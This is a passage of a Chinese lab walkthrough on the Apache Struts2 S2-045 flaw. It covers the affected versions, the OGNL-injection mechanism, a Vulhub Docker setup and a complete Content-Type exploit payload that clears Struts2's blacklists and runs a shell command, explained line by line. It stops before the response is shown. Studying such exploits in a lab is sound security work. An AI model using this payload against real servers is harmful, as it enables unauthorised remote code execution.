&lt;h2 id=&#34;漏洞基本信息&#34;&gt;&lt;a href=&#34;#漏洞基本信息&#34; class=&#34;headerlink&#34; title=&#34;漏洞基本信息&#34;&gt;&lt;/a&gt;漏洞基本信息&lt;/h2&gt;&lt;h3 id=&#34;影响版本&#34;&gt;&lt;a href=&#34;#影响版本&#34; class=&#34;headerlink&#34; title=&#34;影响版本&#34;&gt;&lt;/a&gt;影响版本&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Apache Struts 2.3.5 - 2.3.31&lt;/strong&gt;（包含2.3.31版本）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Apache Struts 2.5.0 - 2.5.10&lt;/strong&gt;（包含2.5.10版本）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;漏洞等级&#34;&gt;&lt;a href=&#34;#漏洞等级&#34; class=&#34;headerlink&#34; title=&#34;漏洞等级&#34;&gt;&lt;/a&gt;漏洞等级&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CVSS评分&lt;/strong&gt;: 10.0（严重）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;漏洞类型&lt;/strong&gt;: 远程代码执行（RCE）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;攻击复杂度&lt;/strong&gt;: 低&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;核心原理&#34;&gt;&lt;a href=&#34;#核心原理&#34; class=&#34;headerlink&#34; title=&#34;核心原理&#34;&gt;&lt;/a&gt;核心原理&lt;/h3&gt;&lt;p&gt;Struts2框架在处理文件上传请求时，会解析Content-Type请求头。当Content-Type格式不正确时，框架会抛出异常，而&lt;strong&gt;异常处理过程中会对错误信息进行OGNL表达式解析&lt;/strong&gt;，这就给了攻击者可乘之机。&lt;/p&gt;
&lt;h2 id=&#34;技术原理深度分析&#34;&gt;&lt;a href=&#34;#技术原理深度分析&#34; class=&#34;headerlink&#34; title=&#34;技术原理深度分析&#34;&gt;&lt;/a&gt;技术原理深度分析&lt;/h2&gt;&lt;h3 id=&#34;OGNL表达式注入机制&#34;&gt;&lt;a href=&#34;#OGNL表达式注入机制&#34; class=&#34;headerlink&#34; title=&#34;OGNL表达式注入机制&#34;&gt;&lt;/a&gt;OGNL表达式注入机制&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;OGNL（Object-Graph Navigation Language）&lt;/strong&gt; 是Struts2框架使用的表达式语言，用于在Java对象之间进行导航和操作。&lt;/p&gt;
&lt;figure class=&#34;highlight stylus&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stylus&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// OGNL表达式示例&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-selector-id&#34;&gt;#context&lt;/span&gt;&lt;span class=&#34;hljs-selector-attr&#34;&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;xwork.MethodAccessor.denyMethodExecution&amp;#x27;&lt;/span&gt;]&lt;/span&gt; = false&lt;br&gt;@java&lt;span class=&#34;hljs-selector-class&#34;&gt;.lang&lt;/span&gt;.Runtime@&lt;span class=&#34;hljs-built_in&#34;&gt;getRuntime&lt;/span&gt;()&lt;span class=&#34;hljs-selector-class&#34;&gt;.exec&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;漏洞触发流程&#34;&gt;&lt;a href=&#34;#漏洞触发流程&#34; class=&#34;headerlink&#34; title=&#34;漏洞触发流程&#34;&gt;&lt;/a&gt;漏洞触发流程&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;请求接收&lt;/strong&gt;: 服务器接收包含恶意Content-Type的HTTP请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;类型解析&lt;/strong&gt;: Struts2尝试解析Content-Type头部信息&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;异常触发&lt;/strong&gt;: 恶意构造的Content-Type导致解析异常&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;错误处理&lt;/strong&gt;: 异常处理器对错误信息进行OGNL解析&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;代码执行&lt;/strong&gt;: 恶意OGNL表达式被执行，实现RCE&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;关键源码分析&#34;&gt;&lt;a href=&#34;#关键源码分析&#34; class=&#34;headerlink&#34; title=&#34;关键源码分析&#34;&gt;&lt;/a&gt;关键源码分析&lt;/h3&gt;&lt;p&gt;漏洞位于&lt;code&gt;org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest&lt;/code&gt;类中：&lt;/p&gt;
&lt;figure class=&#34;highlight typescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs typescript&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 简化的漏洞代码逻辑&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;buildErrorMessage&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-title class_&#34;&gt;Throwable&lt;/span&gt; e, &lt;span class=&#34;hljs-title class_&#34;&gt;Object&lt;/span&gt;[] args&lt;/span&gt;) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-title class_&#34;&gt;String&lt;/span&gt; errorMessage = localizedTextProvider.&lt;span class=&#34;hljs-title function_&#34;&gt;findDefaultText&lt;/span&gt;(e.&lt;span class=&#34;hljs-title function_&#34;&gt;getMessage&lt;/span&gt;(), locale, args);&lt;br&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;// 这里会对errorMessage进行OGNL表达式解析，导致RCE&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (errorMessage != &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;br&gt;        errorMessage = &lt;span class=&#34;hljs-title class_&#34;&gt;TextParseUtil&lt;/span&gt;.&lt;span class=&#34;hljs-title function_&#34;&gt;translateVariables&lt;/span&gt;(errorMessage, stack);&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;实验环境搭建&#34;&gt;&lt;a href=&#34;#实验环境搭建&#34; class=&#34;headerlink&#34; title=&#34;实验环境搭建&#34;&gt;&lt;/a&gt;实验环境搭建&lt;/h2&gt;&lt;h3 id=&#34;系统架构&#34;&gt;&lt;a href=&#34;#系统架构&#34; class=&#34;headerlink&#34; title=&#34;系统架构&#34;&gt;&lt;/a&gt;系统架构&lt;/h3&gt;&lt;figure class=&#34;highlight nix&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs nix&#34;&gt;┌─ 攻击机（Host）&lt;br&gt;│  └─ Windows&lt;span class=&#34;hljs-symbol&#34;&gt;/Linux&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;+&lt;/span&gt; BurpSuite&lt;br&gt;│&lt;br&gt;└─ 靶机（Kali VM）&lt;br&gt;   ├─ &lt;span class=&#34;hljs-params&#34;&gt;IP:&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;56.102&lt;/span&gt;&lt;br&gt;   ├─ Docker &lt;span class=&#34;hljs-operator&#34;&gt;+&lt;/span&gt; Vulhub&lt;br&gt;   └─ Struts2 App (Port &lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;Docker环境部署&#34;&gt;&lt;a href=&#34;#Docker环境部署&#34; class=&#34;headerlink&#34; title=&#34;Docker环境部署&#34;&gt;&lt;/a&gt;Docker环境部署&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 1. 克隆Vulhub项目&lt;/span&gt;&lt;br&gt;git &lt;span class=&#34;hljs-built_in&#34;&gt;clone&lt;/span&gt; https://github.com/vulhub/vulhub.git&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 2. 进入S2-045目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; vulhub/struts2/s2-045&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 3. 启动靶场&lt;/span&gt;&lt;br&gt;docker-compose up -d&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 4. 验证容器状态&lt;/span&gt;&lt;br&gt;docker ps -a&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;预期输出&lt;/strong&gt;:&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;CONTAINER&lt;/span&gt; ID   IMAGE                   COMMAND       CREATED     STATUS      PORTS                    NAMES&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;2363a15cda30&lt;/span&gt;   vulhub/struts2:&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt;   &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;mvn-server&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;min ago   Up &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;min     &lt;span class=&#34;hljs-number&#34;&gt;0.0.0.0:8080&lt;/span&gt;-&amp;gt;&lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt;/tcp  s2-&lt;span class=&#34;hljs-number&#34;&gt;045&lt;/span&gt;-struts2-&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;环境验证&#34;&gt;&lt;a href=&#34;#环境验证&#34; class=&#34;headerlink&#34; title=&#34;环境验证&#34;&gt;&lt;/a&gt;环境验证&lt;/h3&gt;&lt;p&gt;访问 &lt;code&gt;http://192.168.56.102:8080/&lt;/code&gt; 应该能看到Struts2默认页面。&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用实战&#34;&gt;&lt;a href=&#34;#漏洞利用实战&#34; class=&#34;headerlink&#34; title=&#34;漏洞利用实战&#34;&gt;&lt;/a&gt;漏洞利用实战&lt;/h2&gt;&lt;h3 id=&#34;Payload构造原理&#34;&gt;&lt;a href=&#34;#Payload构造原理&#34; class=&#34;headerlink&#34; title=&#34;Payload构造原理&#34;&gt;&lt;/a&gt;Payload构造原理&lt;/h3&gt;&lt;p&gt;恶意Content-Type的核心结构：&lt;/p&gt;
&lt;figure class=&#34;highlight css&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs css&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content&lt;/span&gt;-Type: %&amp;#123;OGNL_EXPRESSION&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;完整攻击载荷&#34;&gt;&lt;a href=&#34;#完整攻击载荷&#34; class=&#34;headerlink&#34; title=&#34;完整攻击载荷&#34;&gt;&lt;/a&gt;完整攻击载荷&lt;/h3&gt;&lt;figure class=&#34;highlight smalltalk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs smalltalk&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;GET&lt;/span&gt; / &lt;span class=&#34;hljs-type&#34;&gt;HTTP&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Host&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.56&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.102&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;8080&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;User&lt;/span&gt;-&lt;span class=&#34;hljs-type&#34;&gt;Agent&lt;/span&gt;: &lt;span class=&#34;hljs-type&#34;&gt;Mozilla&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;5.0&lt;/span&gt; (compatible; &lt;span class=&#34;hljs-type&#34;&gt;MSIE&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;9.0&lt;/span&gt;; &lt;span class=&#34;hljs-type&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;NT&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;6.1&lt;/span&gt;; &lt;span class=&#34;hljs-type&#34;&gt;Win64&lt;/span&gt;; x64)&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Accept&lt;/span&gt;: text/html,application/xhtml+xml,application/xml;q=&lt;span class=&#34;hljs-number&#34;&gt;0.9&lt;/span&gt;,*/*;q=&lt;span class=&#34;hljs-number&#34;&gt;0.8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Connection&lt;/span&gt;: close&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Content&lt;/span&gt;-&lt;span class=&#34;hljs-type&#34;&gt;Type&lt;/span&gt;: %&amp;#123;&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#nike&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;multipart/form-data&amp;#x27;&lt;/span&gt;).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#dm&lt;/span&gt;=@ognl.&lt;span class=&#34;hljs-type&#34;&gt;OgnlContext&lt;/span&gt;@&lt;span class=&#34;hljs-type&#34;&gt;DEFAULT_MEMBER_ACCESS&lt;/span&gt;).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#_memberAccess&lt;/span&gt;?(&lt;span class=&#34;hljs-symbol&#34;&gt;#_memberAccess&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#dm&lt;/span&gt;):(&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#container&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#context&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;com.opensymphony.xwork2.ActionContext.container&amp;#x27;&lt;/span&gt;]).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#ognlUtil&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#container&lt;/span&gt;.getInstance(@com.opensymphony.xwork2.ognl.&lt;span class=&#34;hljs-type&#34;&gt;OgnlUtil&lt;/span&gt;@class)).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedPackageNames().clear()).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedClasses().clear()).&lt;br&gt;        (&lt;span class=&#34;hljs-symbol&#34;&gt;#context&lt;/span&gt;.setMemberAccess(&lt;span class=&#34;hljs-symbol&#34;&gt;#dm&lt;/span&gt;))&lt;br&gt;    )).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#cmd&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#iswin&lt;/span&gt;=(@java.lang.&lt;span class=&#34;hljs-type&#34;&gt;System&lt;/span&gt;@getProperty(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;os.name&amp;#x27;&lt;/span&gt;).toLowerCase().contains(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;win&amp;#x27;&lt;/span&gt;))).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#cmds&lt;/span&gt;=(&lt;span class=&#34;hljs-symbol&#34;&gt;#iswin&lt;/span&gt;?&amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd.exe&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/c&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-symbol&#34;&gt;#cmd&lt;/span&gt;&amp;#125;:&amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/bin/bash&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;-c&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-symbol&#34;&gt;#cmd&lt;/span&gt;&amp;#125;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#p&lt;/span&gt;=new java.lang.&lt;span class=&#34;hljs-type&#34;&gt;ProcessBuilder&lt;/span&gt;(&lt;span class=&#34;hljs-symbol&#34;&gt;#cmds&lt;/span&gt;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#p&lt;/span&gt;.redirectErrorStream(&lt;span class=&#34;hljs-keyword&#34;&gt;true&lt;/span&gt;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#process&lt;/span&gt;=&lt;span class=&#34;hljs-symbol&#34;&gt;#p&lt;/span&gt;.start()).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#ros&lt;/span&gt;=(@org.apache.struts2.&lt;span class=&#34;hljs-type&#34;&gt;ServletActionContext&lt;/span&gt;@getResponse().getOutputStream())).&lt;br&gt;    (@org.apache.commons.io.&lt;span class=&#34;hljs-type&#34;&gt;IOUtils&lt;/span&gt;@copy(&lt;span class=&#34;hljs-symbol&#34;&gt;#process&lt;/span&gt;.getInputStream(),&lt;span class=&#34;hljs-symbol&#34;&gt;#ros&lt;/span&gt;)).&lt;br&gt;    (&lt;span class=&#34;hljs-symbol&#34;&gt;#ros&lt;/span&gt;.flush())&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;Content&lt;/span&gt;-&lt;span class=&#34;hljs-type&#34;&gt;Length&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;Payload逐行解析&#34;&gt;&lt;a href=&#34;#Payload逐行解析&#34; class=&#34;headerlink&#34; title=&#34;Payload逐行解析&#34;&gt;&lt;/a&gt;Payload逐行解析&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;表达式片段&lt;/th&gt;
&lt;th&gt;功能说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#nike=&amp;#39;multipart/form-data&amp;#39;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;设置伪装的Content-Type&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;获取默认成员访问权限&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#_memberAccess=#dm&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;绕过Struts2的安全限制&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#container=#context[...]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;获取ActionContext容器&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#ognlUtil.getExcludedPackageNames().clear()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;清除包名黑名单&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#ognlUtil.getExcludedClasses().clear()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;清除类名黑名单&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#cmd=&amp;#39;whoami&amp;#39;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;定义要执行的命令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#iswin=...contains(&amp;#39;win&amp;#39;)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;判断操作系统类型&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#cmds=(#iswin?&amp;#123;...&amp;#125;:&amp;#123;...&amp;#125;)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;根据系统类型构造命令参数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#p=new ProcessBuilder(#cmds)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;创建进程构建器&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;#process=#p.start()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;启动进程执行命令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;IOUtils@copy(...)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;将命令输出写入HTTP响应&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;攻击效果演示&#34;&gt;&lt;a href=&#34;#攻击效果演示&#34; class=&#34;headerlink&#34; title=&#34;攻击效果演示&#34;&gt;&lt;/a&gt;攻击效果演示&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;请求发送后的响应&lt;/strong&gt;:&lt;/p&gt;
